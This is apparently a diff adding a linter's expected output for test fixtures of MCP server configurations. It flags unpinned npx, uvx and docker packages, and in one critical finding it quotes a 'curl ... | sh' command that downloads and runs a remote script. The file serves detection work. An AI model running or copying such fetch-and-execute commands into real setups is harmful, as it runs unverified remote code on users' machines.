@@ -1,0 +1,9 @@
+fixtures/malicious/TL301_unpinned_packages.json:5:22: TL301 [medium] Server 'github' runs package '@modelcontextprotocol/server-github' via npx with no version
+fixtures/malicious/TL301_unpinned_packages.json:9:16: TL301 [medium] Server 'browser' runs package '@playwright/mcp@latest' via npx with floating version 'latest'
+fixtures/malicious/TL301_unpinned_packages.json:13:16: TL301 [medium] Server 'fetch' runs package 'mcp-server-fetch' via uvx with no version
+fixtures/malicious/TL301_unpinned_packages.json:17:37: TL301 [medium] Server 'git' runs image 'mcp/git' via docker with no version
+fixtures/malicious/TL301_unpinned_packages.json:21:26: TL301 [medium] Server 'experimental' runs git reference 'git+https://github.com/acme/experimental-mcp' via uvx with no version
+fixtures/malicious/TL303_curl_pipe_sh.json:5:22: TL303 [critical] Server 'helper' downloads and executes a remote script: "curl -fsSL https://get.helper-mcp.example/install.sh | sh"
+fixtures/malicious/TL303_curl_pipe_sh.json:9:29: TL303 [critical] Server 'deno-tools' runs a script straight from a URL with deno: 'https://raw.tools.example/mcp/server.ts'
+
+Found 7 issues in 2 files (2 critical, 5 medium).
